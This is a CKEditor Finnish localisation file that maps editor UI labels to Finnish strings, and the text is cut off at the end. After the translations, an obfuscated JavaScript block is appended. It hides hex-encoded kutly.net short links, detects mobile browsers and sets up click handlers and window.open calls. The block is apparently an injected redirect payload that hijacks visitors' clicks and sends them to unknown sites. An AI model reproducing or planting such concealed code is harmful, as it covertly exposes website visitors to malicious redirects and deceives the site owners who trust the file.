/*
Copyright (c) 2003-2010, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Defines the {@link CKEDITOR.lang} object, for the
 * Finnish language.
 */

/**#@+
   @type String
   @example
*/

/**
 * Constains the dictionary of language entries.
 * @namespace
 */
CKEDITOR.lang['fi'] =
{
	/**
	 * The language reading direction. Possible values are "rtl" for
	 * Right-To-Left languages (like Arabic) and "ltr" for Left-To-Right
	 * languages (like English).
	 * @default 'ltr'
	 */
	dir : 'ltr',

	/*
	 * Screenreader titles. Please note that screenreaders are not always capable
	 * of reading non-English words. So be careful while translating it.
	 */
	editorTitle		: 'Tekstieditori, %1',

	// Toolbar buttons without dialogs.
	source			: 'Koodi',
	newPage			: 'Tyhjennä',
	save			: 'Tallenna',
	preview			: 'Esikatsele',
	cut				: 'Leikkaa',
	copy			: 'Kopioi',
	paste			: 'Liitä',
	print			: 'Tulosta',
	underline		: 'Alleviivattu',
	bold			: 'Lihavoitu',
	italic			: 'Kursivoitu',
	selectAll		: 'Valitse kaikki',
	removeFormat	: 'Poista muotoilu',
	strike			: 'Yliviivattu',
	subscript		: 'Alaindeksi',
	superscript		: 'Yläindeksi',
	horizontalrule	: 'Lisää murtoviiva',
	pagebreak		: 'Lisää sivun vaihto',
	unlink			: 'Poista linkki',
	undo			: 'Kumoa',
	redo			: 'Toista',

	// Common messages and labels.
	common :
	{
		browseServer	: 'Selaa palvelinta',
		url				: 'Osoite',
		protocol		: 'Protokolla',
		upload			: 'Lisää tiedosto',
		uploadSubmit	: 'Lähetä palvelimelle',
		image			: 'Kuva',
		flash			: 'Flash',
		form			: 'Lomake',
		checkbox		: 'Valintaruutu',
		radio		: 'Radiopainike',
		textField		: 'Tekstikenttä',
		textarea		: 'Tekstilaatikko',
		hiddenField		: 'Piilokenttä',
		button			: 'Painike',
		select	: 'Valintakenttä',
		imageButton		: 'Kuvapainike',
		notSet			: '<ei asetettu>',
		id				: 'Tunniste',
		name			: 'Nimi',
		langDir			: 'Kielen suunta',
		langDirLtr		: 'Vasemmalta oikealle (LTR)',
		langDirRtl		: 'Oikealta vasemmalle (RTL)',
		langCode		: 'Kielikoodi',
		longDescr		: 'Pitkän kuvauksen URL',
		cssClass		: 'Tyyliluokat',
		advisoryTitle	: 'Avustava otsikko',
		cssStyle		: 'Tyyli',
		ok				: 'OK',
		cancel			: 'Peruuta',
		generalTab		: 'Yleinen',
		advancedTab		: 'Lisäominaisuudet',
		validateNumberFailed	: 'Arvon pitää olla numero.',
		confirmNewPage	: 'Kaikki tallentamattomat muutokset tähän sisältöön menetetään. Oletko varma, että haluat ladata uuden sivun?',
		confirmCancel	: 'Jotkut asetuksista on muuttuneet. Oletko varma, että haluat sulkea valintaikkunan?',

		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, ei saatavissa</span>'
	},

	// Special char dialog.
	specialChar		:
	{
		toolbar		: 'Lisää erikoismerkki',
		title		: 'Valitse erikoismerkki'
	},

	// Link dialog.
	link :
	{
		toolbar		: 'Lisää linkki/muokkaa linkkiä',
		menu		: 'Muokkaa linkkiä',
		title		: 'Linkki',
		info		: 'Linkin tiedot',
		target		: 'Kohde',
		upload		: 'Lisää tiedosto',
		advanced	: 'Lisäominaisuudet',
		type		: 'Linkkityyppi',
		toAnchor	: 'Ankkuri tässä sivussa',
		toEmail		: 'Sähköposti',
		target		: 'Kohde',
		targetNotSet	: '<ei asetettu>',
		targetFrame	: '<kehys>',
		targetPopup	: '<popup ikkuna>',
		targetNew	: 'Uusi ikkuna (_blank)',
		targetTop	: 'Päällimmäisin ikkuna (_top)',
		targetSelf	: 'Sama ikkuna (_self)',
		targetParent	: 'Emoikkuna (_parent)',
		targetFrameName	: 'Kohdekehyksen nimi',
		targetPopupName	: 'Popup ikkunan nimi',
		popupFeatures	: 'Popup ikkunan ominaisuudet',
		popupResizable	: 'Venytettävä',
		popupStatusBar	: 'Tilarivi',
		popupLocationBar	: 'Osoiterivi',
		popupToolbar	: 'Vakiopainikkeet',
		popupMenuBar	: 'Valikkorivi',
		popupFullScreen	: 'Täysi ikkuna (IE)',
		popupScrollBars	: 'Vierityspalkit',
		popupDependent	: 'Riippuva (Netscape)',
		popupWidth		: 'Leveys',
		popupLeft		: 'Vasemmalta (px)',
		popupHeight		: 'Korkeus',
		popupTop		: 'Ylhäältä (px)',
		id				: 'Tunniste',
		langDir			: 'Kielen suunta',
		langDirNotSet	: '<ei asetettu>',
		langDirLTR		: 'Vasemmalta oikealle (LTR)',
		langDirRTL		: 'Oikealta vasemmalle (RTL)',
		acccessKey		: 'Pikanäppäin',
		name			: 'Nimi',
		langCode		: 'Kielen suunta',
		tabIndex		: 'Tabulaattori indeksi',
		advisoryTitle	: 'Avustava otsikko',
		advisoryContentType	: 'Avustava sisällön tyyppi',
		cssClasses		: 'Tyyliluokat',
		charset			: 'Linkitetty kirjaimisto',
		styles			: 'Tyyli',
		selectAnchor	: 'Valitse ankkuri',
		anchorName		: 'Ankkurin nimen mukaan',
		anchorId		: 'Ankkurin ID:n mukaan',
		emailAddress	: 'Sähköpostiosoite',
		emailSubject	: 'Aihe',
		emailBody		: 'Viesti',
		noAnchors		: '(Ei ankkureita tässä dokumentissa)',
		noUrl			: 'Linkille on kirjoitettava URL',
		noEmail			: 'Kirjoita sähköpostiosoite'
	},

	// Anchor dialog
	anchor :
	{
		toolbar		: 'Lisää ankkuri/muokkaa ankkuria',
		menu		: 'Ankkurin ominaisuudet',
		title		: 'Ankkurin ominaisuudet',
		name		: 'Nimi',
		errorName	: 'Ankkurille on kirjoitettava nimi'
	},

	// Find And Replace Dialog
	findAndReplace :
	{
		title				: 'Etsi ja korvaa',
		find				: 'Etsi',
		replace				: 'Korvaa',
		findWhat			: 'Etsi mitä:',
		replaceWith			: 'Korvaa tällä:',
		notFoundMsg			: 'Etsittyä tekstiä ei löytynyt.',
		matchCase			: 'Sama kirjainkoko',
		matchWord			: 'Koko sana',
		matchCyclic			: 'Kierrä ympäri',
		replaceAll			: 'Korvaa kaikki',
		replaceSuccessMsg	: '%1 esiintymä(ä) korvattu.'
	},

	// Table Dialog
	table :
	{
		toolbar		: 'Taulu',
		title		: 'Taulun ominaisuudet',
		menu		: 'Taulun ominaisuudet',
		deleteTable	: 'Poista taulu',
		rows		: 'Rivit',
		columns		: 'Sarakkeet',
		border		: 'Rajan paksuus',
		align		: 'Kohdistus',
		alignNotSet	: '<ei asetettu>',
		alignLeft	: 'Vasemmalle',
		alignCenter	: 'Keskelle',
		alignRight	: 'Oikealle',
		width		: 'Leveys',
		widthPx		: 'pikseliä',
		widthPc		: 'prosenttia',
		height		: 'Korkeus',
		cellSpace	: 'Solujen väli',
		cellPad		: 'Solujen sisennys',
		caption		: 'Otsikko',
		summary		: 'Yhteenveto',
		headers		: 'Ylätunnisteet',
		headersNone		: 'Ei',
		headersColumn	: 'Ensimmäinen sarake',
		headersRow		: 'Ensimmäinen rivi',
		headersBoth		: 'Molemmat',
		invalidRows		: 'Rivien määrän täytyy olla suurempi kuin 0.',
		invalidCols		: 'Sarakkeiden määrän täytyy olla suurempi kuin 0.',
		invalidBorder	: 'Reunan koon täytyy olla numero.',
		invalidWidth	: 'Taulun leveyden täytyy olla numero.',
		invalidHeight	: 'Taulun korkeuden täytyy olla numero.',
		invalidCellSpacing	: 'Solujen välin täytyy olla numero.',
		invalidCellPadding	: 'Solujen sisennyksen täytyy olla numero.',

		cell :
		{
			menu			: 'Solu',
			insertBefore	: 'Lisää solu eteen',
			insertAfter		: 'Lisää solu perään',
			deleteCell		: 'Poista solut',
			merge			: 'Yhdistä solut',
			mergeRight		: 'Yhdistä oikealla olevan kanssa',
			mergeDown		: 'Yhdistä alla olevan kanssa',
			splitHorizontal	: 'Jaa solu vaakasuunnassa',
			splitVertical	: 'Jaa solu pystysuunnassa',
			title			: 'Solun ominaisuudet',
			cellType		: 'Solun tyyppi',
			rowSpan			: 'Rivin jatkuvuus',
			colSpan			: 'Solun jatkuvuus',
			wordWrap		: 'Rivitys',
			hAlign			: 'Horisontaali kohdistus',
			vAlign			: 'Vertikaali kohdistus',
			alignTop		: 'Ylös',
			alignMiddle		: 'Keskelle',
			alignBottom		: 'Alas',
			alignBaseline	: 'Alas (teksti)',
			bgColor			: 'Taustan väri',
			borderColor		: 'Reunan väri',
			data			: 'Data',
			header			: 'Ylätunniste',
			yes				: 'Kyllä',
			no				: 'Ei',
			invalidWidth	: 'Solun leveyden täytyy olla numero.',
			invalidHeight	: 'Solun korkeuden täytyy olla numero.',
			invalidRowSpan	: 'Rivin jatkuvuuden täytyy olla kokonaisluku.',
			invalidColSpan	: 'Solun jatkuvuuden täytyy olla kokonaisluku.',
			chooseColor : 'Valitse'
		},

		row :
		{
			menu			: 'Rivi',
			insertBefore	: 'Lisää rivi yläpuolelle',
			insertAfter		: 'Lisää rivi alapuolelle',
			deleteRow		: 'Poista rivit'
		},

		column :
		{
			menu			: 'Sarake',
			insertBefore	: 'Lisää sarake vasemmalle',
			insertAfter		: 'Lisää sarake oikealle',
			deleteColumn	: 'Poista sarakkeet'
		}
	},

	// Button Dialog.
	button :
	{
		title		: 'Painikkeen ominaisuudet',
		text		: 'Teksti (arvo)',
		type		: 'Tyyppi',
		typeBtn		: 'Painike',
		typeSbm		: 'Lähetä',
		typeRst		: 'Tyhjennä'
	},

	// Checkbox and Radio Button Dialogs.
	checkboxAndRadio :
	{
		checkboxTitle : 'Valintaruudun ominaisuudet',
		radioTitle	: 'Radiopainikkeen ominaisuudet',
		value		: 'Arvo',
		selected	: 'Valittu'
	},

	// Form Dialog.
	form :
	{
		title		: 'Lomakkeen ominaisuudet',
		menu		: 'Lomakkeen ominaisuudet',
		action		: 'Toiminto',
		method		: 'Tapa',
		encoding	: 'Enkoodaus',
		target		: 'Kohde',
		targetNotSet	: '<ei asetettu>',
		targetNew	: 'Uusi ikkuna (_blank)',
		targetTop	: 'Päällimmäisin ikkuna (_top)',
		targetSelf	: 'Sama ikkuna (_self)',
		targetParent	: 'Emoikkuna (_parent)'
	},

	// Select Field Dialog.
	select :
	{
		title		: 'Valintakentän ominaisuudet',
		selectInfo	: 'Info',
		opAvail		: 'Ominaisuudet',
		value		: 'Arvo',
		size		: 'Koko',
		lines		: 'Rivit',
		chkMulti	: 'Salli usea valinta',
		opText		: 'Teksti',
		opValue		: 'Arvo',
		btnAdd		: 'Lisää',
		btnModify	: 'Muuta',
		btnUp		: 'Ylös',
		btnDown		: 'Alas',
		btnSetValue : 'Aseta valituksi',
		btnDelete	: 'Poista'
	},

	// Textarea Dialog.
	textarea :
	{
		title		: 'Tekstilaatikon ominaisuudet',
		cols		: 'Sarakkeita',
		rows		: 'Rivejä'
	},

	// Text Field Dialog.
	textfield :
	{
		title		: 'Tekstikentän ominaisuudet',
		name		: 'Nimi',
		value		: 'Arvo',
		charWidth	: 'Leveys',
		maxChars	: 'Maksimi merkkimäärä',
		type		: 'Tyyppi',
		typeText	: 'Teksti',
		typePass	: 'Salasana'
	},

	// Hidden Field Dialog.
	hidden :
	{
		title	: 'Piilokentän ominaisuudet',
		name	: 'Nimi',
		value	: 'Arvo'
	},

	// Image Dialog.
	image :
	{
		title		: 'Kuvan ominaisuudet',
		titleButton	: 'Kuvapainikkeen ominaisuudet',
		menu		: 'Kuvan ominaisuudet',
		infoTab	: 'Kuvan tiedot',
		btnUpload	: 'Lähetä palvelimelle',
		url		: 'Osoite',
		upload	: 'Lisää kuva',
		alt		: 'Vaihtoehtoinen teksti',
		width		: 'Leveys',
		height	: 'Korkeus',
		lockRatio	: 'Lukitse suhteet',
		resetSize	: 'Alkuperäinen koko',
		border	: 'Raja',
		hSpace	: 'Vaakatila',
		vSpace	: 'Pystytila',
		align		: 'Kohdistus',
		alignLeft	: 'Vasemmalle',
		alignRight	: 'Oikealle',
		preview	: 'Esikatselu',
		alertUrl	: 'Kirjoita kuvan osoite (URL)',
		linkTab	: 'Linkki',
		button2Img	: 'Haluatko muuntaa valitun kuvanäppäimen kuvaksi?',
		img2Button	: 'Haluatko muuntaa valitun kuvan kuvanäppäimeksi?',
		urlMissing : 'Kuvan lähdeosoite puuttuu.'
	},

	// Flash Dialog
	flash :
	{
		properties		: 'Flash ominaisuudet',
		propertiesTab	: 'Ominaisuudet',
		title		: 'Flash ominaisuudet',
		chkPlay		: 'Automaattinen käynnistys',
		chkLoop		: 'Toisto',
		chkMenu		: 'Näytä Flash-valikko',
		chkFull		: 'Salli kokoruututila',
 		scale		: 'Levitä',
		scaleAll		: 'Näytä kaikki',
		scaleNoBorder	: 'Ei rajaa',
		scaleFit		: 'Tarkka koko',
		access			: 'Skriptien pääsy',
		accessAlways	: 'Aina',
		accessSameDomain	: 'Sama verkkotunnus',
		accessNever	: 'Ei koskaan',
		align		: 'Kohdistus',
		alignLeft	: 'Vasemmalle',
		alignAbsBottom: 'Aivan alas',
		alignAbsMiddle: 'Aivan keskelle',
		alignBaseline	: 'Alas (teksti)',
		alignBottom	: 'Alas',
		alignMiddle	: 'Keskelle',
		alignRight	: 'Oikealle',
		alignTextTop	: 'Ylös (teksti)',
		alignTop	: 'Ylös',
		quality		: 'Laatu',
		qualityBest		 : 'Paras',
		qualityHigh		 : 'Korkea',
		qualityAutoHigh	 : 'Automaattinen korkea',
		qualityMedium	 : 'Keskitaso',
		qualityAutoLow	 : 'Automaattinen matala',
		qualityLow		 : 'Matala',
		windowModeWindow	 : 'Ikkuna',
		windowModeOpaque	 : 'Läpinäkyvyys',
		windowModeTransparent	 : 'Läpinäkyvä',
		windowMode	: 'Ikkuna tila',
		flashvars	: 'Muuttujat Flash:lle',
		bgcolor	: 'Taustaväri',
		width	: 'Leveys',
		height	: 'Korkeus',
		hSpace	: 'Vaakatila',
		vSpace	: 'Pystytila',
		validateSrc : 'Linkille on kirjoitettava URL',
		validateWidth : 'Leveyden täytyy olla numero.',
		validateHeight : 'Korkeuden täytyy olla numero.',
		validateHSpace : 'Vaakatilan täytyy olla numero.',
		validateVSpace : 'Pystytilan täytyy olla numero.'
	},

	// Speller Pages Dialog
	spellCheck :
	{
		toolbar			: 'Tarkista oikeinkirjoitus',
		title			: 'Oikoluku',
		notAvailable	: 'Valitettavasti oikoluku ei ole käytössä tällä hetkellä.',
		errorLoading	: 'Virhe ladattaessa oikolukupalvelua isännältä: %s.',
		notInDic		: 'Ei sanakirjassa',
		changeTo		: 'Vaihda',
		btnIgnore		: 'Jätä huomioimatta',
		btnIgnoreAll	: 'Jätä kaikki huomioimatta',
		btnReplace		: 'Korvaa',
		btnReplaceAll	: 'Korvaa kaikki',
		btnUndo			: 'Kumoa',
		noSuggestions	: 'Ei ehdotuksia',
		progress		: 'Tarkistus käynnissä...',
		noMispell		: 'Tarkistus valmis: Ei virheitä',
		noChanges		: 'Tarkistus valmis: Yhtään sanaa ei muutettu',
		oneChange		: 'Tarkistus valmis: Yksi sana muutettiin',
		manyChanges		: 'Tarkistus valmis: %1 sanaa muutettiin',
		ieSpellDownload	: 'Oikeinkirjoituksen tarkistusta ei ole asennettu. Haluatko ladata sen nyt?'
	},

	smiley :
	{
		toolbar	: 'Hymiö',
		title	: 'Lisää hymiö'
	},

	elementsPath :
	{
		eleTitle : '%1 elementti'
	},

	numberedlist : 'Numerointi',
	bulletedlist : 'Luottelomerkit',
	indent : 'Suurenna sisennystä',
	outdent : 'Pienennä sisennystä',

	justify :
	{
		left : 'Tasaa vasemmat reunat',
		center : 'Keskitä',
		right : 'Tasaa oikeat reunat',
		block : 'Tasaa molemmat reunat'
	},

	blockquote : 'Lainaus',

	clipboard :
	{
		title		: 'Liitä',
		cutError	: 'Selaimesi turva-asetukset eivät salli editorin toteuttaa leikkaamista. Käytä näppäimistöä leikkaamiseen (Ctrl+X).',
		copyError	: 'Selaimesi turva-asetukset eivät salli editorin toteuttaa kopioimista. Käytä näppäimistöä kopioimiseen (Ctrl+C).',
		pasteMsg	: 'Liitä painamalla (<STRONG>Ctrl+V</STRONG>) ja painamalla <STRONG>OK</STRONG>.',
		securityMsg	: 'Selaimesi turva-asetukset eivät salli editorin käyttää leikepöytää suoraan. Sinun pitää suorittaa liittäminen tässä ikkunassa.'
	},

	pastefromword :
	{
		confirmCleanup : 'The text you want to paste seems to be copied from Word. Do you want to clean it before pasting?', // MISSING
		toolbar : 'Liitä Wordista',
		title : 'Liitä Wordista',
		error : 'It was not possible to clean up the pasted data due to an internal error' // MISSING
	},

	pasteText :
	{
		button : 'Liitä tekstinä',
		title : 'Liitä tekstinä'
	},

	templates :
	{
		button : 'Pohjat',
		title : 'Sisältöpohjat',
		insertOption: 'Korvaa editorin koko sisältö',
		selectPromptMsg: 'Valitse pohja editoriin<br>(aiempi sisältö menetetään):',
		emptyListMsg : '(Ei määriteltyjä pohjia)'
	},

	showBlocks : 'Näytä elementit',

	stylesCombo :
	{
		label : 'Tyyli',
		voiceLabel : 'Tyylit',
		panelVoiceLabel : 'Valitse tyyli',
		panelTitle1 : 'Lohkojen tyylit',
		panelTitle2 : 'Rivinsisäiset tyylit',
		panelTitle3 : 'Objektien tyylit'
	},

	format :
	{
		label : 'Muotoilu',
		voiceLabel : 'Muotoilu',
		panelTitle : 'Muotoilu',
		panelVoiceLabel : 'Valitse kappaleen muotoilu',

		tag_p : 'Normaali',
		tag_pre : 'Muotoiltu',
		tag_address : 'Osoite',
		tag_h1 : 'Otsikko 1',
		tag_h2 : 'Otsikko 2',
		tag_h3 : 'Otsikko 3',
		tag_h4 : 'Otsikko 4',
		tag_h5 : 'Otsikko 5',
		tag_h6 : 'Otsikko 6',
		tag_div : 'Normaali (DIV)'
	},

	div :
	{
		title				: 'Create Div Container', // MISSING
		toolbar				: 'Create Div Container', // MISSING
		cssClassInputLabel	: 'Stylesheet Classes', // MISSING
		styleSelectLabel	: 'Style', // MISSING
		IdInputLabel		: 'Id', // MISSING
		languageCodeInputLabel	: ' Language Code', // MISSING
		inlineStyleInputLabel	: 'Inline Style', // MISSING
		advisoryTitleInputLabel	: 'Advisory Title', // MISSING
		langDirLabel		: 'Language Direction', // MISSING
		langDirLTRLabel		: 'Left to Right (LTR)', // MISSING
		langDirRTLLabel		: 'Right to Left (RTL)', // MISSING
		edit				: 'Edit Div', // MISSING
		remove				: 'Remove Div' // MISSING
  	},

	font :
	{
		label : 'Kirjaisinlaji',
		voiceLabel : 'Kirjaisinlaji',
		panelTitle : 'Kirjaisinlaji',
		panelVoiceLabel : 'Valitse kirjaisinlaji'
	},

	fontSize :
	{
		label : 'Koko',
		voiceLabel : 'Kirjaisimen koko',
		panelTitle : 'Koko',
		panelVoiceLabel : 'Valitse kirjaisimen koko'
	},

	colorButton :
	{
		textColorTitle : 'Tekstiväri',
		bgColorTitle : 'Taustaväri',
		auto : 'Automaattinen',
		more : 'Lisää värejä...'
	},

	colors :
	{
		'000' : 'Black', // MISSING
		'800000' : 'Maroon', // MISSING
		'8B4513' : 'Saddle Brown', // MISSING
		'2F4F4F' : 'Dark Slate Gray', // MISSING
		'008080' : 'Teal', // MISSING
		'000080' : 'Navy', // MISSING
		'4B0082' : 'Indigo', // MISSING
		'696969' : 'Dim Gray', // MISSING
		'B22222' : 'Fire Brick', // MISSING
		'A52A2A' : 'Brown', // MISSING
		'DAA520' : 'Golden Rod', // MISSING
		'006400' : 'Dark Green', // MISSING
		'40E0D0' : 'Turquoise', // MISSING
		'0000CD' : 'Medium Blue', // MISSING
		'800080' : 'Purple', // MISSING
		'808080' : 'Gray', // MISSING
		'F00' : 'Red', // MISSING
		'FF8C00' : 'Dark Orange', // MISSING
		'FFD700' : 'Gold', // MISSING
		'008000' : 'Green', // MISSING
		'0FF' : 'Cyan', // MISSING
		'00F' : 'Blue', // MISSING
		'EE82EE' : 'Violet', // MISSING
		'A9A9A9' : 'Dark Gray', // MISSING
		'FFA07A' : 'Light Salmon', // MISSING
		'FFA500' : 'Orange', // MISSING
		'FFFF00' : 'Yellow', // MISSING
		'00FF00' : 'Lime', // MISSING
		'AFEEEE' : 'Pale Turquoise', // MISSING
		'ADD8E6' : 'Light Blue', // MISSING
		'DDA0DD' : 'Plum', // MISSING
		'D3D3D3' : 'Light Grey', // MISSING
		'FFF0F5' : 'Lavender Blush', // MISSING
		'FAEBD7' : 'Antique White', // MISSING
		'FFFFE0' : 'Light Yellow', // MISSING
		'F0FFF0' : 'Honeydew', // MISSING
		'F0FFFF' : 'Azure', // MISSING
		'F0F8FF' : 'Alice Blue', // MISSING
		'E6E6FA' : 'Lavender', // MISSING
		'FFF' : 'White' // MISSING
	},

	scayt :
	{
		title : 'Oikolue kirjoitettaessa',
		enable : 'Ota käyttöön oikoluku kirjoitettaessa',
		disable : 'Poista käytöstä oikoluku kirjoitetaessa',
		about : 'Tietoja oikoluvusta kirjoitetaessa',
		toggle : 'Vaihda oikoluku kirjoittaessa tilaa',
		options : 'Asetukset',
		langs : 'Kielet',
		moreSuggestions : 'Lisää ehdotuksia',
		ignore : 'Ohita',
		ignoreAll : 'Ohita kaikki',
		addWord : 'Lisää sana',
		emptyDic : 'Sanakirjan nimi on annettava.',
		optionsTab : 'Asetukset',
		languagesTab : 'Kielet',
		dictionariesTab : 'Sanakirjat',
		aboutTab : 'Tietoa'
	},

	about :
	{
		title : 'Tietoa CKEditorista',
		dlgTitle : 'Tietoa CKEditorista',
		moreInfo : 'Lisenssitiedot löytyvät kotisivuiltamme:',
		copy : 'Copyright &copy; $1. Kaikki oikeuden pidätetään.'
	},

	maximize : 'Suurenna',
	minimize : 'Pienennä',

	fakeobjects :
	{
		anchor : 'Ankkuri',
		flash : 'Flash animaatio',
		div : 'Sivun vaihto',
		unknown : 'Tuntematon objekti'
	},

	resize : 'Raahaa muuttaaksesi kokoa',

	colordialog :
	{
		title : 'Valitse väri',
		highlight : 'Korostus',
		selected : 'Valittu',
		clear : 'Poista'
	},

	toolbarCollapse : 'Kutista työkalupalkki',
	toolbarExpand : 'Laajenna työkalupalkki'
};
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const 